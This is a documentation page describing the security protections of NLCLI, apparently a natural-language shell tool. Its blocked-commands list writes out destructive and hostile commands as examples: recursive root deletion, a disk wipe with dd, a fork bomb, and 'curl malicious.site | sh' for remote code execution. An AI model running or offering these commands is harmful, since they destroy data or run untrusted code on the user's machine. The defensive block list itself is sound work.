# Security Features

## Built-in Safety Protections

NLCLI is designed with security as the primary concern. Every command is validated before execution.

## What's Automatically Blocked

### System-wide Dangerous Commands
```bash
❌ rm -rf /                    # System-wide deletion
❌ chmod -R 777 *              # Dangerous permissions  
❌ curl malicious.site | sh    # Remote code execution
❌ dd if=/dev/zero of=/dev/sda # Disk wiping
❌ :(){ :|:& }                 # Fork bombs
❌ sudo rm -rf /               # Privileged deletion
```

### Path Restrictions
- System directories (`/var`, `/etc`, `/sys`, etc.) are protected
- Operations limited to user-accessible directories
- Automatic detection and blocking of sensitive paths

## Confirmation Required Operations

These operations require user confirmation before execution:

```bash
⚠️  rm large-file.zip          # File deletion
⚠️  find . -name "*.tmp" -delete # Bulk deletion
⚠️  mv important/ /tmp/        # Moving important directories
⚠️  kill process named chrome  # Process termination
```

## Safety Features

### 1. Dry-run by Default
Every command is shown to you before execution:
```bash
› delete temp files
💡 I'll find and delete temporary files in the current directory.
📝 Command: find . -name "*.tmp" -type f -delete
⚠️  This will modify your system. Continue? [y/N]
```

### 2. Resource Limits
- **Timeouts**: Commands automatically terminate after 30 seconds (configurable)
- **Output limits**: Large outputs are truncated to prevent system overload
- **Memory limits**: Commands run with restricted resource usage

### 3. Audit Logging
All operations are logged for security review:
```bash
› audit                        # View audit trail
› security scan               # Run security analysis
```

### 4. Sandboxed Execution
Commands run in a restricted environment:
- Limited access to system directories
- No network access for dangerous operations
- Temporary directory isolation

## Security Configuration

### Basic Security Settings
```json
{
  "safety": {
    "timeout_seconds": 30,
    "max_output_size": "1MB",
    "confirm_destructive": true,
    "allow_system_paths": false
  }
}
```

### Enterprise Security
```json
{
  "enterprise": {
    "enabled": true,
    "audit_retention_days": 365,
    "require_user_authentication": true,
    "security_scan_enabled": true
  },
  "security": {
    "enable_rbac": true,
    "enable_audit_logging": true,
    "enable_policy_enforcement": true
  }
}
```

## Security Commands

### View Security Status
```bash
› security                     # Show security overview
› security scan               # Run comprehensive security scan
› policies                     # Show active security policies
```

### Audit Trail
```bash
› audit                        # Show recent audit entries
› audit export                # Export audit log
› audit search "command"       # Search audit history
```

## Best Practices

### 1. Regular Security Scans
Run periodic security scans:
```bash
› security scan
```

### 2. Review Audit Logs
Regularly check the audit trail:
```bash
› audit
```

### 3. Use Confirmations
Keep confirmations enabled for destructive operations:
```json
{
  "preferences": {
    "confirm_by_default": true
  }
}
```

### 4. Restrict Allowed Directories
Limit operations to specific directories:
```json
{
  "preferences": {
    "allowed_directories": ["/Users/username", "/tmp"]
  }
}
```

## Reporting Security Issues

If you discover a security vulnerability, please report it to:
- Email: security@nlcli.org
- Use GitHub's private vulnerability reporting
- Follow responsible disclosure practices

## Security Audit Results

NLCLI has undergone comprehensive security testing:
- ✅ Command injection prevention
- ✅ Path traversal protection  
- ✅ Resource exhaustion mitigation
- ✅ Privilege escalation blocking
- ✅ Remote code execution prevention